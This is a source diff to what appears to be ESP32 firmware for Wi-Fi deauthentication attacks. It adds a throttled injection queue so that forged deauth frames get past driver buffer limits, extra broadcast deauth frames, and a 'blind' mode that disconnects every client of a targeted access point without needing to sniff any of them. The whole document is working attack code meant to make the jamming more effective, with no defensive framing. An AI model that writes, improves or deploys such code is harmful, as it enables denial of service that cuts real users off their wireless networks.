@@ -68,6 +68,45 @@ uint8_t s_probe_channel = 1;
 
 volatile uint32_t s_rx_total = 0;
 volatile uint32_t s_rx_match = 0;
+// Raw injection accounting: every esp_wifi_80211_tx() call is counted, so a
+// "deauth_frames grows but nothing happens" report can be split into
+// "the driver refused the frame" vs "the frame went out and the client ignored it".
+uint32_t s_tx_ok = 0;
+uint32_t s_tx_err = 0;
+int s_tx_last_err = 0;
+uint32_t s_tx_err_nomem = 0;
+uint32_t s_tx_err_invalid = 0;
+uint32_t s_tx_err_other = 0;
+uint32_t s_tx_dropped = 0;
+uint32_t s_blind_frames = 0;
+
+// The sniffer runs in the Wi-Fi task: blasting 16 raw frames from there starves
+// the driver's TX buffers (half of the calls returned ESP_ERR_NO_MEM), so the
+// callback only records "who to kick" and the main loop does the injection at a
+// controlled rate.
+struct pending_tx_t {
+    uint8_t client[6];
+    uint8_t bssid[6];
+};
+const int kTxQueue = 16;
+pending_tx_t s_txq[kTxQueue];
+volatile int s_txq_head = 0;
+volatile int s_txq_tail = 0;
+uint32_t s_last_inject_ms = 0;
+uint32_t s_last_blind_ms = 0;
+// Burst in progress. A burst is 16 frames, but a single tick cannot push 16
+// frames through the driver (it answers ESP_ERR_NO_MEM long before that), so the
+// burst is drained frame by frame across ticks and never silently loses frames.
+uint8_t s_burst_client[6];
+uint8_t s_burst_bssid[6];
+int s_burst_left = 0;
+uint32_t s_backoff_until_ms = 0;
+// Received frames by category: management subtypes 0..15 (deauth = 12),
+// beacon = 8, probe resp = 5, plus control/data totals. This is how we prove
+// from a second board that our forged frames really reached the air.
+volatile uint32_t s_rx_mgmt_sub[16];
+volatile uint32_t s_rx_ctrl = 0;
+volatile uint32_t s_rx_data = 0;
 rx_sample_t s_rx_log[kRxLogSize];
 volatile int s_rx_log_count = 0;
 
@@ -202,13 +241,99 @@ size_t build_beacon_like(uint8_t* frame, uint8_t subtype, const uint8_t dest[6],
     return n;
 }
 
-void inject_deauth(const uint8_t station[6], const uint8_t bssid[6]) {
+int find_ap(const uint8_t bssid[6]);
+
+void reset_diag_counters(void) {
+    s_tx_ok = 0;
+    s_tx_err = 0;
+    s_tx_last_err = 0;
+    s_tx_err_nomem = 0;
+    s_tx_err_invalid = 0;
+    s_tx_err_other = 0;
+    s_tx_dropped = 0;
+    s_blind_frames = 0;
+    s_txq_head = 0;
+    s_txq_tail = 0;
+    s_last_inject_ms = 0;
+    s_last_blind_ms = 0;
+    s_burst_left = 0;
+    s_backoff_until_ms = 0;
+    s_rx_ctrl = 0;
+    s_rx_data = 0;
+    for (int i = 0; i < 16; i++) {
+        s_rx_mgmt_sub[i] = 0;
+    }
+}
+
+void queue_deauth(const uint8_t client[6], const uint8_t bssid[6]) {
+    const int next = (s_txq_head + 1) % kTxQueue;
+    if (next == s_txq_tail) {
+        s_tx_dropped++;
+        return;
+    }
+    memcpy(s_txq[s_txq_head].client, client, 6);
+    memcpy(s_txq[s_txq_head].bssid, bssid, 6);
+    s_txq_head = next;
+}
+
+// Returns true when the driver accepted the frame.
+bool inject_one(const uint8_t station[6], const uint8_t bssid[6]) {
     uint8_t frame[32];
     const size_t len = build_deauth(frame, station, bssid, s_reason);
-    for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
-        esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
+    const esp_err_t res = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
+    if (res != ESP_OK) {
+        s_tx_err++;
+        s_tx_last_err = (int)res;
+        // Buffers are full: backing off 5 ms is much cheaper than hammering the
+        // driver every millisecond (which is what inflated txerr before).
+        s_backoff_until_ms = millis() + 5;
+        if (res == ESP_ERR_NO_MEM) {
+            s_tx_err_nomem++;
+        } else if (res == ESP_ERR_INVALID_ARG) {
+            s_tx_err_invalid++;
+        } else {
+            s_tx_err_other++;
+        }
+        return false;
     }
-    s_deauth_frames += NUM_FRAMES_PER_DEAUTH;
+    s_tx_ok++;
+    s_deauth_frames++;
+    return true;
+}
+
+// Push as much of the pending burst as the driver accepts, then stop and resume
+// on the next tick (attack_step calls this every few ms).
+void drain_tx_queue(void) {
+    if (s_burst_left == 0) {
+        if (s_txq_tail == s_txq_head) {
+            return;
+        }
+        memcpy(s_burst_client, s_txq[s_txq_tail].client, 6);
+        memcpy(s_burst_bssid, s_txq[s_txq_tail].bssid, 6);
+        s_txq_tail = (s_txq_tail + 1) % kTxQueue;
+        s_burst_left = NUM_FRAMES_PER_DEAUTH;
+        eliminated_stations++;
+        if (s_mode == ATTACK_DEAUTH_MULTI) {
+            const int idx = find_ap(s_burst_bssid);
+            if (idx >= 0) {
+                s_aps[idx].frames += NUM_FRAMES_PER_DEAUTH + NUM_BROADCAST_PER_DEAUTH;
+            }
+        }
+    }
+    while (s_burst_left > 0) {
+        if (!inject_one(s_burst_client, s_burst_bssid)) {
+            return;  // buffers full: retry this frame after the backoff
+        }
+        s_burst_left--;
+    }
+
+    // One broadcast deauth on top of the unicast burst: plenty of cheap clients
+    // only act on the broadcast form, and it costs a single frame.
+    for (int i = 0; i < NUM_BROADCAST_PER_DEAUTH; i++) {
+        if (!inject_one(kBroadcast, s_burst_bssid)) {
+            return;
+        }
+    }
 }
 
 int find_ap(const uint8_t bssid[6]) {
@@ -228,7 +353,22 @@ IRAM_ATTR void sniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
     const mac_hdr_t* hdr = &packet->hdr;
 
     s_rx_total = s_rx_total + 1;
-    if (raw->rx_ctrl.sig_len <= sizeof(mac_hdr_t)) {
+
+    const uint16_t sig_len = raw->rx_ctrl.sig_len;
+    const uint16_t fc = hdr->frame_ctrl;
+    const uint8_t frame_type = (uint8_t)((fc >> 2) & 0x03);
+    const uint8_t frame_subtype = (uint8_t)((fc >> 4) & 0x0F);
+    if (frame_type == 0) {
+        if (frame_subtype < 16) {
+            s_rx_mgmt_sub[frame_subtype] = s_rx_mgmt_sub[frame_subtype] + 1;
+        }
+    } else if (frame_type == 1) {
+        s_rx_ctrl = s_rx_ctrl + 1;
+    } else if (frame_type == 2) {
+        s_rx_data = s_rx_data + 1;
+    }
+
+    if (sig_len <= sizeof(mac_hdr_t)) {
         return;
     }
     if (s_rx_log_count < kRxLogSize) {
@@ -236,17 +376,18 @@ IRAM_ATTR void sniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
         memcpy(sample->dest, hdr->dest, 6);
         memcpy(sample->src, hdr->src, 6);
         memcpy(sample->bssid, hdr->bssid, 6);
-        const uint16_t fc = hdr->frame_ctrl;
-        sample->type = (uint8_t)((fc >> 2) & 0x03);
-        sample->subtype = (uint8_t)((fc >> 4) & 0x0F);
-        sample->len = raw->rx_ctrl.sig_len;
+        sample->type = frame_type;
+        sample->subtype = frame_subtype;
+        sample->len = sig_len;
         s_rx_log_count = s_rx_log_count + 1;
     }
 
-    // Control frames are short: CTS/ACK only carry Addr1.
-    const uint16_t sig_len = raw->rx_ctrl.sig_len;
-    const bool has_addr2 = sig_len >= 22;
-    const bool has_addr3 = sig_len >= 28;
+    // Address fields present? Control frames are short: RTS / PS-Poll carry
+    // Addr1+Addr2 in 16 bytes (+4 FCS = 20), so the management-oriented 22 byte
+    // threshold used to reject every RTS before its Addr2 was ever looked at.
+    const bool is_ctrl = (frame_type == 1);
+    const bool has_addr2 = is_ctrl ? (sig_len >= 20) : (sig_len >= 22);
+    const bool has_addr3 = !is_ctrl && (sig_len >= 28);
 
     if (s_sta_scan_active) {
         if (has_addr2 && memcmp(hdr->dest, kBroadcast, 6) != 0 &&
@@ -289,8 +430,7 @@ IRAM_ATTR void sniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
         }
         if (matched) {
             s_rx_match = s_rx_match + 1;
-            inject_deauth(client, s_single_bssid);
-            eliminated_stations++;
+            queue_deauth(client, s_single_bssid);
         }
         return;
     }
@@ -300,9 +440,7 @@ IRAM_ATTR void sniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
             const int idx = find_ap(hdr->dest);
             if (idx >= 0) {
                 s_rx_match = s_rx_match + 1;
-                inject_deauth(hdr->src, hdr->dest);
-                s_aps[idx].frames += NUM_FRAMES_PER_DEAUTH;
-                eliminated_stations++;
+                queue_deauth(hdr->src, hdr->dest);
                 return;
             }
         }
@@ -311,9 +449,7 @@ IRAM_ATTR void sniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
             if (idx >= 0 && memcmp(hdr->dest, kBroadcast, 6) != 0 &&
                 memcmp(hdr->dest, hdr->bssid, 6) != 0) {
                 s_rx_match = s_rx_match + 1;
-                inject_deauth(hdr->dest, hdr->bssid);
-                s_aps[idx].frames += NUM_FRAMES_PER_DEAUTH;
-                eliminated_stations++;
+                queue_deauth(hdr->dest, hdr->bssid);
             }
         }
     }
@@ -357,6 +493,7 @@ void begin_multi(uint16_t reason) {
     s_rx_total = 0;
     s_rx_match = 0;
     s_rx_log_count = 0;
+    reset_diag_counters();
     apply_band_mode();
     apply_country(CHANNEL_MAX, true);
     radio_to_sta();
@@ -393,6 +530,7 @@ bool attack_deauth_single(int index, uint16_t reason) {
     s_rx_total = 0;
     s_rx_match = 0;
     s_rx_log_count = 0;
+    reset_diag_counters();
     s_ap_count = 0;
 
     apply_band_mode();
@@ -456,6 +594,7 @@ bool attack_deauth_except(const int* idx, int count, uint16_t reason) {
 }
 
 bool attack_probe_broadcast() {
+    reset_diag_counters();
     s_mode = ATTACK_PROBE_BROADCAST;
     s_probe_frames = 0;
     s_last_probe = 0;
@@ -490,6 +629,39 @@ void attack_step() {
             s_sta_scan_ready = true;
         }
         return;
+    }
+
+    if (s_mode == ATTACK_DEAUTH_SINGLE || s_mode == ATTACK_DEAUTH_MULTI) {
+        if (now != s_last_inject_ms && (int32_t)(now - s_backoff_until_ms) >= 0) {
+            s_last_inject_ms = now;
+            drain_tx_queue();
+        }
+    }
+
+    // Blind fallback: a broadcast deauth to the AP we are parked on. It needs no
+    // sniffed client, so it still does something when every client in the BSS is
+    // silent -- or talks 802.11ax, which an 11n radio cannot decode at all.
+    if (s_mode == ATTACK_DEAUTH_SINGLE) {
+        if (now - s_last_blind_ms >= BLIND_DEAUTH_PERIOD_MS) {
+            s_last_blind_ms = now;
+            if (inject_one(kBroadcast, s_single_bssid)) {
+                s_blind_frames++;
+            }
+        }
+    } else if (s_mode == ATTACK_DEAUTH_MULTI) {
+        if (now - s_last_blind_ms >= BLIND_DEAUTH_PERIOD_MS) {
+            s_last_blind_ms = now;
+            for (int tries = 0; tries < s_ap_count; tries++) {
+                const int idx = (s_ap_cursor + tries + s_ap_count) % s_ap_count;
+                if (s_aps[idx].enabled) {
+                    if (inject_one(kBroadcast, s_aps[idx].bssid)) {
+                        s_blind_frames++;
+                        s_aps[idx].frames++;
+                    }
+                    break;
+                }
+            }
+        }
     }
 
     if (s_mode == ATTACK_DEAUTH_MULTI) {
@@ -563,6 +735,50 @@ uint32_t attack_probe_frames() {
 
 uint32_t attack_rx_frames() {
     return s_rx_total;
+}
+
+uint32_t attack_tx_ok() {
+    return s_tx_ok;
+}
+
+uint32_t attack_tx_err() {
+    return s_tx_err;
+}
+
+int attack_tx_last_err(void) {
+    return s_tx_last_err;
+}
+
+uint32_t attack_tx_err_nomem(void) {
+    return s_tx_err_nomem;
+}
+
+uint32_t attack_tx_err_invalid(void) {
+    return s_tx_err_invalid;
+}
+
+uint32_t attack_tx_err_other(void) {
+    return s_tx_err_other;
+}
+
+uint32_t attack_tx_dropped(void) {
+    return s_tx_dropped;
+}
+
+uint32_t attack_blind_frames() {
+    return s_blind_frames;
+}
+
+void attack_rx_mix(uint32_t mgmt_sub[16], uint32_t* ctrl, uint32_t* data) {
+    for (int i = 0; i < 16; i++) {
+        mgmt_sub[i] = s_rx_mgmt_sub[i];
+    }
+    if (ctrl != nullptr) {
+        *ctrl = s_rx_ctrl;
+    }
+    if (data != nullptr) {
+        *data = s_rx_data;
+    }
 }
 
 uint32_t attack_rx_matches() {
